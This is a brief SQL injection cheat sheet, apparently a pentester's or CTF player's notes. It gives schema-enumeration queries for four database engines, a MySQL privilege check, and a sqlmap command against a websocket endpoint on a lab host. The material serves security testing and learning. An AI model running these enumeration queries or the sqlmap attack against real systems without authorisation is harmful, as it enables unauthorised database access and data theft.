---
title: SQL Injection
description: SQL Injection cheatsheet
---

# SQL Injection

## Extract table and column names

### Oracle

```sql
SELECT LISTAGG(table_name, ',') FROM all_tables

SELECT LISTAGG(column_name, ',') FROM all_tab_columns
WHERE table_name = 'TABLE-NAME-HERE'
```

### Microsoft

```sql
SELECT STRING_AGG(table_name, CHAR(44)) FROM information_schema.tables

SELECT STRING_AGG(column_name, CHAR(44)) FROM information_schema.columns
WHERE table_name = 'TABLE-NAME-HERE'
```

### PostgreSQL

```sql
SELECT STRING_AGG(table_name, ',') FROM information_schema.tables

SELECT STRING_AGG(column_name, ',') FROM information_schema.columns
WHERE table_name = 'TABLE-NAME-HERE'
```

### MySQL

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables

SELECT GROUP_CONCAT(column_name) FROM information_schema.columns
WHERE table_name = 'TABLE-NAME-HERE'`
```


> References [portswigger.net - cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## Privileges

### MySQL

```sql
SHOW GRANTS;
```

## Others

### MySQL

Use `--vertical` to enable the vertical format or ending query with `\G`, example : `SELECT * FROM users \G`.

```sql
> SELECT * FROM city WHERE countrycode='AUT';
*************************** 1. row ***************************
	ID: 1523
	Name: Wien
	CountryCode: AUT
	District: Wien
	Info: {"Population": 1608144}
```

> Source [dev.mysql.com](https://dev.mysql.com/doc/mysql-shell/8.0/en/mysql-shell-output-vertical.html).

### SQL Injection in Websockets

Example of command using SQLmap :

```
$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"57636*"}'
```

Another way would be to use an HTTP server as proxy: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
